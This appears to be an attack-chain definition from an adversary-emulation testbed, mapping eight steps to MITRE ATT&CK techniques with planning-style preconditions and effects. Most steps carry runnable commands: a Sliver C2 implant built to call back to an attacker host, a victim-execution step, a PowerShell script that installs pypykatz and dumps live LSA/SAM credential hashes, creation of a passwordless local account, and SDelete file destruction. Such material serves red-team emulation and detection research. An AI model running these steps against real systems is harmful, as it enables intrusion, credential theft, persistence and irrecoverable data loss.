# Chain 011

**Testbed**: `env0` · **Steps**: 8 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1049 |
| Credential Access | T1003.002 |
| Persistence | T1136.001 |
| Impact | T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1049 | Network Connection Enumeration | Sliver Executor |
| 5 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 6 | Credential Access | T1003.002 | Registry parse with pypykatz | Powershell Executor |
| 7 | Persistence | T1136.001 | Create a new user in PowerShell | Powershell Executor |
| 8 | Impact | T1485 | Windows - Overwrite file with SysInternals SDelete | Powershell Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — Network Connection Enumeration

- **UUID**: `sliver-netstat`
- **Source**: Sliver
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1049
- **Technique(s)**: System Network Connections Discovery

**Description**

The `netstat` command enumerates active network connections.

**Execution** (Sliver Executor)

```
netstat(tcp=#{tcp}, udp=#{udp}, ipv4=#{ipv4}, ipv6=#{ipv6}, listening=#{listening}, session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `tcp` | Show TCP connections (true/false) | True | yes |
| `udp` | Show UDP connections (true/false) | True | yes |
| `ipv4` | Show IPv4 connections (true/false) | True | yes |
| `ipv6` | Show IPv6 connections (true/false) | True | yes |
| `listening` | Show listening ports (true/false) | True | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(system-network-connections-info-known ?target - host)`

---

### Step 5 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 6 — Registry parse with pypykatz

- **UUID**: `art-t1003_002-pypykatz-live-lsa`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.002
- **Technique(s)**: OS Credential Dumping: Security Account Manager

**Description**

`pypykatz live lsa` reads live LSA / SAM state and prints hashes and
cached secrets to stdout. Method 3 folds the heavy prereq chain
(install Python, create venv, pip install pypykatz) — this fold is
expensive on first run; realistic simulation envs would pre-provision
Python. ART auto_generated_guid a96872b2-cbf3-46cf-8eb4-27e8c0e85263.

**Execution** (Powershell Executor)

```
$venv = "#{venv_path}"
if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  if (-not (Get-Command py -ErrorAction Ignore)) {
    $pySetup = "$env:TEMP\python_setup.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
    Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
  }
  py -m venv $venv
  & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
}
& "$venv\Scripts\pypykatz.exe" live lsa
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke pypykatz. | — | yes |
| `venv_path` | Target-side path to a Python venv containing pypykatz. | C:\\Users\\Public\\venv_pypykatz | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 7 — Create a new user in PowerShell

- **UUID**: `art-t1136_001-new-localuser-ps`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1136.001
- **Technique(s)**: Create Account: Local Account

**Description**

PowerShell variant of local user creation: `New-LocalUser -NoPassword`
creates a passwordless local account. Same persistence outcome as
net user, cleaner cmdlet trail. ART auto_generated_guid
bc8be0ac-475c-4fbf-9b1d-9fffd77afbde.

**Execution** (Powershell Executor)

```
New-LocalUser -Name "#{username}" -NoPassword
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke New-LocalUser. | — | yes |
| `username` | Local account name to create. | BackupSvcPs | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(user-created ?u - user ?target - host)`

---

### Step 8 — Windows - Overwrite file with SysInternals SDelete

- **UUID**: `art-t1485-sdelete-overwrite`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1485
- **Technique(s)**: Data Destruction

**Description**

Sysinternals SDelete overwrites a file with a random pattern before
deleting it, preventing forensic recovery. Method 3 folds the ART
prereq (download SDelete.zip from Sysinternals, expand, copy sdelete.exe).
ART auto_generated_guid 476419b5-aebf-4366-a131-ae3e8dae5fc2.

**Execution** (Powershell Executor)

```
$sdelete = "#{sdelete_exe}"
if (-not (Test-Path $sdelete)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $zipPath = "$env:TEMP\SDelete.zip"
  $extractDir = "$env:TEMP\Sdelete"
  Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile $zipPath
  Expand-Archive $zipPath $extractDir -Force
  New-Item -ItemType Directory (Split-Path $sdelete) -Force | Out-Null
  Copy-Item "$extractDir\sdelete.exe" $sdelete -Force
}
if (-not (Test-Path "#{file_to_delete}")) { New-Item "#{file_to_delete}" -Force | Out-Null }
& $sdelete -accepteula "#{file_to_delete}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke SDelete. | — | yes |
| `sdelete_exe` | Target-side path where sdelete.exe is staged. | C:\\Users\\Public\\sdelete.exe | yes |
| `file_to_delete` | Target-side path to the file that SDelete will overwrite and delete. | C:\\Users\\Public\\wipe-me.txt | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
